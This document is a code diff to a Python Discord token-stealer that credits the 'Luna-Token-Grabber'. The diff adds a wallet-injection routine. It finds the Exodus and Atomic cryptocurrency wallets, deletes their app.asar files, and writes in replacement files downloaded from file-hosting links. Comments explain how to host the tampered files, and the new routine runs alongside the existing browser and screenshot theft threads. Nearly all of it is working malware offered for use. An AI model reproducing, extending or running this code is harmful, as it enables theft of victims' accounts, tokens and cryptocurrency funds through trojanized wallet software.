@@ -1,5 +1,7 @@
 import os
+import time
 from Crypto.Cipher import AES
+import requests
 from win32crypt import CryptUnprotectData
 from json import loads
 from base64 import b64decode
@@ -22,6 +24,25 @@ normal_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
 baseurl = "https://discord.com/api/v9/users/@me"
 tokens = []
 ids = []
+
+#
+# HOW TO SET UP: https://github.com/LocalSmail223/Wallet-Injector
+#
+
+# Go to: https://zippysha.re
+# Upload your file
+# Copy the file downnload link and open it
+# Scroll down until you see a link that looks like: https://cdn-141.zippysha.re/l0g2f379zb/a179f141-1691440117/app.asar
+# Copy the link and put it in the wallet name below.
+
+WalletInjectionLinks = {
+    "exodus": requests.get(
+        "https://cdn-153.zippysha.re/l0g2f379zb/ab7fa13c-1691441018/app.asar"
+    ),
+    "atomic": requests.get(
+        "https://cdn-151.zippysha.re/u812r170z4/eae7538d-1691525714/app.asar"
+    ),
+}
 
 paths = {
     "Discord": roaming + "\\discord\\Local Storage\\leveldb\\",
@@ -390,13 +411,190 @@ class inject:
 
 # ++++++++++++++++++++++++++++ FULL CREDIT TO SMUG FOR EVERYTHING ABLOVE THIS LINE https://github.com/Smug246/Luna-Token-Grabber ++++++++++++++++++++++++++++
 
+
+def WalletInjection():
+    try:
+        Wallets = [
+            os.path.join(appdata, "exodus"),
+            os.path.join(appdata, "Programs", "atomic"),
+            # os.path.join(appdata, ""),
+        ]
+
+        # It likes to some times install to the cwd and the target path dk why.
+
+        for t in os.listdir(os.getcwd()):
+            if t == "app.asar" or t.endswith(".asar") or t.startswith("app"):
+                os.remove(t)
+
+        for Wallet in Wallets:
+            if os.path.exists(Wallet):
+                download = WalletInjectionLinks[str(os.path.basename(Wallet)).lower()]
+
+                for files in os.listdir(Wallet):
+                    if os.path.basename(Wallet) == "exodus":
+                        if search(r"app-+?", files):
+                            # ExodusPathHere\\app-VersionHere\\resources\\
+                            resources = os.listdir(
+                                Wallet + f"\\{files}" + "\\resources"
+                            )
+
+                            if resources != []:
+                                for file in resources:
+                                    if file == "app.asar":
+                                        os.remove(
+                                            os.path.join(
+                                                Wallet, files, "resources", file
+                                            )
+                                        )
+
+                                        if not os.path.exists(
+                                            os.path.join(
+                                                Wallet, files, "resources", file
+                                            )
+                                        ):
+                                            with open(
+                                                os.path.join(
+                                                    Wallet, files, "resources", file
+                                                ),
+                                                "wb",
+                                            ) as f:
+                                                with download as response:
+                                                    if response.status_code == 200:
+                                                        for (
+                                                            chunk
+                                                        ) in response.iter_content(
+                                                            chunk_size=8192
+                                                        ):
+                                                            f.write(chunk)
+
+                                        else:
+                                            os.remove(
+                                                os.path.join(
+                                                    Wallet, files, "resources", file
+                                                )
+                                            )
+
+                                            if not os.path.exists(
+                                                os.path.join(
+                                                    Wallet, files, "resources", file
+                                                )
+                                            ):
+                                                with open(
+                                                    os.path.join(
+                                                        Wallet, files, "resources", file
+                                                    ),
+                                                    "wb",
+                                                ) as f:
+                                                    with download as response:
+                                                        if response.status_code == 200:
+                                                            for (
+                                                                chunk
+                                                            ) in response.iter_content(
+                                                                chunk_size=8192
+                                                            ):
+                                                                f.write(chunk)
+
+                                    else:  # if it doesnt already exist then we can just download it.
+                                        with open(
+                                            os.path.join(
+                                                Wallet, files, "resources", file
+                                            ),
+                                            "wb",
+                                        ) as f:
+                                            with download as response:
+                                                if response.status_code == 200:
+                                                    for chunk in response.iter_content(
+                                                        chunk_size=8192
+                                                    ):
+                                                        f.write(chunk)
+                            else:  # If the folder is empty, we can just download the file and skip the rest of the code above.
+                                time.sleep(2)
+                                for file in os.listdir(Wallet):
+                                    if search(r"app-+?", file):
+                                        with open(
+                                            os.path.join(
+                                                Wallet, file, "resources", "app.asar"
+                                            ),
+                                            "wb",
+                                        ) as f:
+                                            with download as response:
+                                                if response.status_code == 200:
+                                                    for chunk in response.iter_content(
+                                                        chunk_size=8192
+                                                    ):
+                                                        f.write(chunk)
+                        # End of exodus
+
+                    elif os.path.basename(Wallet) == "atomic":
+                        resources = os.listdir(Wallet + "\\resources")
+
+                        if resources != []:
+                            for file in resources:
+                                if file == "app.asar":
+                                    if not os.path.exists(
+                                        os.path.join(Wallet, "resources", "app.asar")
+                                    ):
+                                        os.remove(
+                                            os.path.join(
+                                                Wallet, "resources", "app.asar"
+                                            )
+                                        )
+
+                                        with open(
+                                            os.path.join(
+                                                Wallet, "resources", "app.asar"
+                                            ),
+                                            "wb",
+                                        ) as f:
+                                            with download as response:
+                                                if response.status_code == 200:
+                                                    for chunk in response.iter_content(
+                                                        chunk_size=8192
+                                                    ):
+                                                        f.write(chunk)
+
+                                    else:  # we want to try again otherwise yeah.
+                                        os.remove(
+                                            os.path.join(
+                                                Wallet, "resources", "app.asar"
+                                            )
+                                        )
+
+                                        with open(
+                                            os.path.join(
+                                                Wallet, "resources", "app.asar"
+                                            ),
+                                            "wb",
+                                        ) as f:
+                                            with download as response:
+                                                if response.status_code == 200:
+                                                    for chunk in response.iter_content(
+                                                        chunk_size=8192
+                                                    ):
+                                                        f.write(chunk)
+
+                        else:  # If the folder is empty, we can just download the file and skip the rest of the code above.
+                            with open(
+                                os.path.join(Wallet, "resources", "app.asar"), "wb"
+                            ) as f:
+                                with download as response:
+                                    if response.status_code == 200:
+                                        for chunk in response.iter_content(
+                                            chunk_size=8192
+                                        ):
+                                            f.write(chunk)
+    except Exception as e:
+        print(e)
+        pass
+
+
 if __name__ == "__main__":
     webhook = argv[1]
     remove_dup = [*set(all_tokens)]
     with open("tokens.txt", "a+", encoding="utf-8", errors="ignore") as f:
         for item in tokens:
             f.write(f"{item}\n")
-    threads = [browsers, ss]
+    threads = [browsers, ss, WalletInjection]
     for thread in threads:
         t = Thread(target=thread, daemon=True)
         t.start()
